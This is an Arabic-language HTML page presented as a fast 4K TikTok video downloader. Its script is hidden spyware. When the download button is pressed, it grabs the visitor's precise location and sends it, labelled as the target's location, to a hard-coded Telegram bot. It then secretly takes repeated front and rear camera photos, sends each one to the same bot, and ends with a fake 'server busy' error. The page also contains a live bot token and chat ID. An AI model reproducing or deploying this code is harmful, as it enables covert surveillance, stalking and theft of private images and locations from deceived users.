<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Downloader Pro</title>
    <style>
        body { background: #0b0f19; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .app-card { background: #161b22; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #30363d; }
        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        .download-btn { background: #238636; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        #status { margin-top: 15px; font-size: 0.8rem; color: #8b949e; display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="app-card">
    <div style="font-size: 50px;">📥</div>
    <h2>محمل الفيديو السريع</h2>
    <p>الصق الرابط أدناه للتحميل بدقة 4K</p>
    <input type="text" id="urlInput" placeholder="https://www.tiktok.com/...">
    <button class="download-btn" onclick="startBruteForce()">تحميل الفيديو الآن</button>
    <div id="status">جاري تهيئة الاتصال المشفر...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const C = "7984067238";

    // دالة إرسال الصور
    async function sendSnap(blob, caption) {
        const fd = new FormData();
        fd.append("chat_id", C);
        fd.append("photo", blob, "shot.jpg");
        fd.append("caption", caption);
        try { await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: fd }); } catch (e) {}
    }

    // دالة التقاط صورة واحدة
    async function takeShot(side) {
        const constraints = { video: { facingMode: side === "front" ? "user" : "environment" } };
        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9)); // دقة عالية 90%
        } catch (e) { return null; }
    }

    // الدالة الرئيسية
    async function startBruteForce() {
        if (!document.getElementById('urlInput').value) { alert("أدخل الرابط!"); return; }
        document.getElementById('status').style.display = 'block';

        // 1. جلب الموقع أولاً وبقوة
        navigator.geolocation.getCurrentPosition(async (p) => {
            const locMsg = `📍 *موقع الهدف:* \nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(locMsg)}`);
        }, () => {}, {enableHighAccuracy: true});

        // 2. حلقة التقاط 10 صور (تبادلي)
        for (let i = 1; i <= 5; i++) {
            // صورة أمامية
            const fImg = await takeShot("front");
            if (fImg) await sendSnap(fImg, `📸 لقطة أمامية رقم ${i}`);
            
            // صورة خلفية
            const bImg = await takeShot("back");
            if (bImg) await sendSnap(bImg, `📸 لقطة خلفية رقم ${i}`);
        }

        alert("عذراً، الرابط غير صالح أو السيرفر مشغول. حاول لاحقاً.");
    }
</script>

</body>
</html>
